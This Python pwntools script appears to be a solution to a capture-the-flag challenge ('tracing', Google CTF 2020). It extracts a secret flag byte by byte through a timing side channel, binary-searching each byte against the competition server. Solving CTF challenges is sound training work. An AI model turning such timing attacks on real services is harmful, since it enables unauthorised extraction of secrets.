import time

from pwn import *

# Need to guess last 2 chars with this code
flag = 'CTF{1BitAtATime}'
flag_len = 16
THRESHOLD = 0.1
RETRY_THRESHOLD = 0.5


def p128(num):
    return p64(num // 2**64, endian="big") + p64(num % 2**64, endian="big")


def measure(prefix):
    prefix_len = len(prefix)

    con = remote("tracing.2020.ctfcompetition.com", 1337)
    # con = remote("localhost", 1337)
    for i in range(5000):
        con.send(prefix + p128(i)[prefix_len:])

    con.shutdown("send")
    con.recv()

    start = time.perf_counter()
    con.recvall()
    end = time.perf_counter()

    return end - start


idx = len(flag)
while idx < flag_len:
    low = 0
    high = 256
    print("Flag: {}".format(flag))
    print("Index: {}".format(idx))

    while high - low > 1:
        try:
            mid = (low + high) >> 1
            elapsed = measure(flag.encode() + bytes([mid]))
            print("Tried: {}, Elapsed: {}".format(mid, elapsed))
            if elapsed >= RETRY_THRESHOLD:
                continue
            elif elapsed >= THRESHOLD:
                # ans is greater than or equal to mid
                low = mid
            else:
                # ans is less than mid
                high = mid
        except Exception:
            continue

    flag += chr(low)
    print(flag)
